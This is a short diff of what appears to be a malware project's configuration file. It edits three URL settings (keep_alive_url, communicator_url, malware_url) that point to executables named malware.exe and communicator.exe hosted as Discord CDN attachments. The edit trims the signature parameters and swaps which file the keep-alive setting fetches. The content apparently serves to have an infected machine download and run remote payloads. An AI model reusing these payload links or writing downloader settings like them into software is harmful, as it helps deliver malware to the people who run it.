@@ -1,3 +1,3 @@
-keep_alive_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390575232090112/communicator.exe?ex=67244deb&is=6722fc6b&hm=b2caf11ac6e04d1adb9c1c3f8cbb3d96f468d7697ec9025c0859cef7b130bcb3&
-communicator_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390575232090112/communicator.exe?ex=67244deb&is=6722fc6b&hm=b2caf11ac6e04d1adb9c1c3f8cbb3d96f468d7697ec9025c0859cef7b130bcb3&
-malware_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390533310152765/malware.exe?ex=67244de1&is=6722fc61&hm=03e7d27f52e1456dffd17794eda7dabc3d7ac81097dd4a8140cc5500a9cd37f6&
+keep_alive_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390533310152765/malware.exe?
+communicator_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390575232090112/communicator.exe?
+malware_url = https://cdn.discordapp.com/attachments/1284871126379401307/1301390533310152765/malware.exe?
